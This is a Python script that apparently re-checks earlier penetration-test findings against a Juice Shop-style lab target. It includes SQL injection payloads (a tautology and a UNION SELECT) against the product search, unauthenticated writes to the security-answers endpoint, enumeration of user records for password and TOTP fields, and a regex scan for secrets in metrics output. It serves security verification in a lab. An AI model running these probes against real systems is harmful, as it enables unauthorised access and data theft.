#!/usr/bin/env python3
"""Fresh independent verification of prior findings F23-F26 against the live target.
Captures ACTUAL observed behavior and timestamps; never backfills.
"""
import json, re, time, urllib.request, urllib.error

BASE = "http://lab-mutator:3000"
OUT = "/workspace/reports/repro_live.json"

def now():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

def req(path, method="GET", headers=None, body=None, timeout=20):
    h = dict(headers or {})
    h["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    data = body.encode() if isinstance(body, str) else body
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode("utf-8", "replace")
        except Exception:
            b = ""
        return e.code, dict(e.headers), b
    except Exception as e:
        return None, {}, str(e)

def scan_secrets(text):
    hits = [l for l in text.splitlines() if re.search(r"\b(secret|password=|api[_-]?key|token\b.*=)", l.lower())]
    # filter HELP/word-only matches
    hits = [l for l in hits if not re.search(r"^\s*# HELP", l)]
    return hits[:20]

E = {"observed_at": now(), "target": BASE, "baseline": {}, "findings": {}, "auth_probe": {}, "other": {}}

# ---------- Pass 0 baseline ----------
st, h, b = req("/")
E["baseline"]["root_get"] = {"status": st, "content_type": h.get("Content-Type"), "length": len(b)}
st, h, b = req("/robots.txt")
E["baseline"]["robots"] = {"status": st, "body": b.strip()}
st, h, b = req("/metrics")
E["baseline"]["metrics"] = {"status": st, "content_type": h.get("Content-Type"), "length": len(b)}
E["baseline"]["metrics_secrets"] = scan_secrets(b)
st, h, b = req("/api/Challenges/")
try:
    c = json.loads(b)
    E["baseline"]["challenges"] = {"count": len(c.get("data", [])), "keys": sorted(set(x.get("key","") for x in c.get("data", [])))[:30]}
except Exception:
    E["baseline"]["challenges"] = {"parse_error": True, "length": len(b)}
st, h, b = req("/api/Products")
E["baseline"]["products"] = {"status": st, "length": len(b)}
st, h, b = req("/rest/user/whoami")
E["baseline"]["whoami"] = {"status": st, "body_len": len(b)}

# ---------- F23: /rest/memories unauth enumeration ----------
st, h, b = req("/rest/memories")
E["findings"]["F23"] = {"GET_status": st, "GET_ct": h.get("Content-Type"), "GET_length": len(b), "controls": {}}
if st == 200:
    try:
        recs = json.loads(b)
        recs = recs if isinstance(recs, list) else recs.get("data", recs.get("results", []))
        E["findings"]["F23"]["record_count"] = len(recs)
        if recs:
            E["findings"]["F23"]["sample_user_fields"] = list(recs[0].keys())
            E["findings"]["F23"]["sample"] = {k: (str(v)[:40] if not isinstance(v, (int, float, bool, type(None))) else v) for k, v in recs[0].items()}
            E["findings"]["F23"]["has_password"] = "password" in recs[0]
            E["findings"]["F23"]["has_deluxe_token"] = "deluxeToken" in recs[0]
            E["findings"]["F23"]["has_totp_secret"] = "totpSecret" in recs[0]
    except Exception as ex:
        E["findings"]["F23"]["parse_error"] = str(ex)
# bogus Bearer control
st2, h2, b2 = req("/rest/memories", headers={"Authorization": "Bearer xxx"})
E["findings"]["F23"]["bogus_bearer_status"] = st2
E["findings"]["F23"]["bogus_bearer_identical"] = (st2 == 200 and b2 == b)
# control neighbors
for ctrl in ["/rest/wallet/balance", "/rest/basket", "/rest/user/authentication-details"]:
    st, h, b = req(ctrl)
    E["findings"]["F23"]["controls"][ctrl] = st

# ---------- F24: /api/SecurityAnswers/ read-gated, write-open ----------
E["findings"]["F24"] = {}
st, h, b = req("/api/SecurityAnswers/")
E["findings"]["F24"]["GET_status"] = st
payload = {"questionId": 7, "answer": "verify-new-" + now(), "email": "verify@repro.test"}
st, h, b = req("/api/SecurityAnswers/", method="POST",
                headers={"Content-Type": "application/json; charset=utf-8"}, body=json.dumps(payload))
E["findings"]["F24"]["POST1_status"] = st
E["findings"]["F24"]["POST1_id"] = json.loads(b)["data"].get("id") if st == 201 else None
# empty object
st, h, b = req("/api/SecurityAnswers/", method="POST",
                headers={"Content-Type": "application/json; charset=utf-8"}, body="{}")
E["findings"]["F24"]["POST_empty_status"] = st
E["findings"]["F24"]["POST_empty_id"] = json.loads(b)["data"].get("id") if st == 201 else None
# repeat identical payload
st, h, b = req("/api/SecurityAnswers/", method="POST",
                headers={"Content-Type": "application/json; charset=utf-8"}, body=json.dumps(payload))
E["findings"]["F24"]["POST2_status"] = st
E["findings"]["F24"]["POST2_id"] = json.loads(b)["data"].get("id") if st == 201 else None

# ---------- F25: /rest/products/search filter bypass ----------
E["findings"]["F25"] = {}
st, h, b = req("/rest/products/search?q=Apple")
E["findings"]["F25"]["q_Apple_status"] = st
E["findings"]["F25"]["q_Apple_length"] = len(b)
try:
    ids_apple = [x.get("id") for x in (json.loads(b).get("data", json.loads(b)))]
    E["findings"]["F25"]["q_Apple_ids"] = ids_apple
except Exception:
    E["findings"]["F25"]["q_Apple_ids"] = None
# tautology
st, h, b = req("/rest/products/search?q=%27%20OR%20%271%27=%271")
E["findings"]["F25"]["tautology_status"] = st
E["findings"]["F25"]["tautology_length"] = len(b)
try:
    ids_all = [x.get("id") for x in (json.loads(b).get("data", json.loads(b)))]
    E["findings"]["F25"]["tautology_ids"] = ids_all
    # payload-membership check against product names
    st, h, p = req("/api/Products")
    names = [x.get("name", "") for x in (json.loads(p).get("data", json.loads(p)))]
    E["findings"]["F25"]["catalog_names_count"] = len(names)
    E["findings"]["F25"]["tautology_in_catalog_names"] = any("OR '1'='1" in n for n in names)
    E["findings"]["F25"]["tautology_returns_all"] = (ids_all and set(ids_apple).issubset(set(ids_all)))
except Exception as ex:
    E["findings"]["F25"]["calc_error"] = str(ex)
# malformed -> 500
st, h, b = req("/rest/products/search?q=%27%20UNION%20SELECT%201,2,3--")
E["findings"]["F25"]["malformed_status"] = st
E["findings"]["F25"]["malformed_preview"] = b[:150].replace("\n", " ")
# LIKE-with-comment (safe) probe
st, h, b = req("/rest/products/search?q=test%27--")
E["findings"]["F25"]["comment_status"] = st
E["findings"]["F25"]["comment_length"] = len(b)

# ---------- F26: /metrics content ----------
E["findings"]["F26"] = {}
st, h, b = req("/metrics")
E["findings"]["F26"] = {"GET_status": st, "GET_ct": h.get("Content-Type"), "GET_length": len(b)}
E["findings"]["F26"]["metrics_secrets"] = scan_secrets(b)
E["findings"]["F26"]["gauges_seen"] = re.findall(r"juiceshop_[\w]+", b)[:15]

# ---------- Auth-surface probe (UNTESTED frontier cell) ----------
st, h, b = req("/rest/user/login", method="POST",
                headers={"Content-Type": "application/json"}, body='{"email":"a@b.com","password":"c"}')
E["auth_probe"]["login_POST_status"] = st
E["auth_probe"]["login_POST_body"] = b[:200].replace("\n", " ")

# ---------- CAPTCHA leak probe (negative-space, mutation-fragile) ----------
st, h, b = req("/rest/captcha")
E["other"]["captcha"] = {"GET_status": st, "GET_ct": h.get("Content-Type"), "GET_length": len(b)}
if st == 200:
    try:
        E["other"]["captcha"]["body"] = json.loads(b)
        E["other"]["captcha"]["answer_visible"] = "answer" in json.loads(b)
    except Exception:
        E["other"]["captcha"]["parse_error"] = True

with open(OUT, "w") as f:
    json.dump(E, f, indent=1)
print(json.dumps(E, indent=1))
